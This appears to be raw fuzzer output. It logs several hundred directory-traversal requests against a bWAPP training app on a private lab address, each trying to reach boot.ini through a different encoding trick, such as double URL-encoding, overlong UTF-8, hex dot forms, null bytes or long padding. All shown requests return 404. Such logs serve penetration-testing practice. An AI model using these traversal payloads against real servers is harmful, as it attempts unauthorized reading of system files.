431,404,9L,39W,http://192.168.1.86/bWAPP/..\..\..\..\..\..\..\..\boot.ini;index.html
418,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
417,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252fboot.ini;index.html
425,404,9L,39W,http://192.168.1.86/bWAPP/..\..\boot.ini;index.html
419,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
435,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5cboot.ini;index.html
434,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5cboot.ini;index.html
437,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
436,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
441,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\boot.ini;index.html
423,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini;index.html
424,404,9L,39W,http://192.168.1.86/bWAPP/..\boot.ini;index.html
347,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255cboot.ini%00index.html
354,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\boot.ini%00index.html
340,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
339,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
365,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
409,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/boot.ini;index.html
412,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
404,404,9L,39W,http://192.168.1.86/bWAPP/..%252f..%252f..%252f..%252f..%252fboot.ini;index.html
364,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
366,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini%00index.html
345,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255cboot.ini%00index.html
415,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini;index.html
394,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
442,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
440,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\boot.ini;index.html
331,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini%00index.html
341,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini%00index.html
398,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
448,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5cboot.ini;index.html
443,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
445,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
444,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
399,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
449,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5cboot.ini;index.html
450,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
447,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
446,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\boot.ini;index.html
376,404,9L,39W,http://192.168.1.86/bWAPP/..%2fboot.ini;index.html
454,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
455,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
456,404,9L,39W,http://192.168.1.86/bWAPP/..%255cboot.ini;index.html
453,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
463,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini;index.html
464,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\boot.ini;index.html
461,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255cboot.ini;index.html
459,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255cboot.ini;index.html
469,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
457,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255cboot.ini;index.html
400,404,9L,39W,http://192.168.1.86/bWAPP/..%252fboot.ini;index.html
475,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
478,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
480,404,9L,39W,http://192.168.1.86/bWAPP/\../boot.ini
493,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\boot.ini
492,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\boot.ini
476,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
487,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\../\../boot.ini
497,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../boot.ini
474,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
473,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255cboot.ini;index.html
496,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../boot.ini
495,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\/..\boot.ini
494,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\/..\/..\/..\boot.ini
471,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
488,404,9L,39W,http://192.168.1.86/bWAPP//..\boot.ini
470,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
483,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../boot.ini
528,404,9L,39W,http://192.168.1.86/bWAPP/.../boot.ini
513,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../boot.ini
530,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../boot.ini
532,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../boot.ini
531,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../boot.ini
533,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../boot.ini
535,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../.../.../boot.ini
534,404,9L,39W,http://192.168.1.86/bWAPP/.../.../.../.../.../.../.../boot.ini
536,404,9L,39W,http://192.168.1.86/bWAPP/...\boot.ini
538,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\boot.ini
537,404,9L,39W,http://192.168.1.86/bWAPP/...\...\boot.ini
490,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\boot.ini
484,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../boot.ini
489,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\boot.ini
547,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../boot.ini
544,404,9L,39W,http://192.168.1.86/bWAPP/..../boot.ini
542,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\boot.ini
543,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\...\...\boot.ini
548,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../boot.ini
540,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\boot.ini
545,404,9L,39W,http://192.168.1.86/bWAPP/..../..../boot.ini
546,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../boot.ini
491,404,9L,39W,http://192.168.1.86/bWAPP//..\/..\/..\/..\boot.ini
485,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../boot.ini
551,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../..../..../boot.ini
550,404,9L,39W,http://192.168.1.86/bWAPP/..../..../..../..../..../..../..../boot.ini
486,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../\../\../\../\../boot.ini
458,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255cboot.ini;index.html
529,404,9L,39W,http://192.168.1.86/bWAPP/.../.../boot.ini
477,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
479,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
465,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\boot.ini;index.html
468,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
466,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
397,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini;index.html
481,404,9L,39W,http://192.168.1.86/bWAPP/\../\../boot.ini
552,404,9L,39W,http://192.168.1.86/bWAPP/....\boot.ini
512,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../boot.ini
467,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini;index.html
539,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\boot.ini
482,404,9L,39W,http://192.168.1.86/bWAPP/\../\../\../boot.ini
541,404,9L,39W,http://192.168.1.86/bWAPP/...\...\...\...\...\...\boot.ini
553,404,9L,39W,http://192.168.1.86/bWAPP/....\....\boot.ini
329,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\boot.ini%00index.html
554,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\boot.ini
323,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5cboot.ini%00index.html
353,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\boot.ini%00index.html
462,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini;index.html
344,404,9L,39W,http://192.168.1.86/bWAPP/..%255cboot.ini%00index.html
472,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255cboot.ini;index.html
325,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5cboot.ini%00index.html
452,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini;index.html
559,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\....\boot.ini
556,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\boot.ini
573,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\boot.ini
571,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\boot.ini
570,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\boot.ini
568,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\boot.ini
569,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\boot.ini
555,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\boot.ini
574,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\boot.ini
575,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\..\..\..\boot.ini
557,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\boot.ini
558,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\....\boot.ini
562,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../../boot.ini
560,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../boot.ini
572,404,9L,39W,http://192.168.1.86/bWAPP/..........................................................................\..\..\..\..\boot.ini
561,404,9L,39W,http://192.168.1.86/bWAPP/........................................................................../../boot.ini
643,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2fboot.ini
646,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
644,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
642,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2fboot.ini
645,404,9L,39W,http://192.168.1.86/bWAPP/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
640,404,9L,39W,http://192.168.1.86/bWAPP/..0x2fboot.ini
653,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
656,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2fboot.ini
657,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
659,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
654,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
658,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
662,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
661,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
655,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
664,404,9L,39W,http://192.168.1.86/bWAPP/..0x5cboot.ini
665,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5cboot.ini
666,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5cboot.ini
667,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5cboot.ini
671,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
673,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\boot.ini
674,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
650,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
676,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
675,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
669,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
679,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
681,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
680,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5cboot.ini
668,404,9L,39W,http://192.168.1.86/bWAPP/..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
663,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fboot.ini
682,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
683,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
678,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
684,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
687,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
686,404,9L,39W,http://192.168.1.86/bWAPP/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini
689,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2fboot.ini
690,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2fboot.ini
692,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
688,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2fboot.ini
693,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
691,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
696,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/boot.ini
698,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
702,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
700,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
694,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fboot.ini
701,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
703,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
699,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
697,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini
704,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2fboot.ini
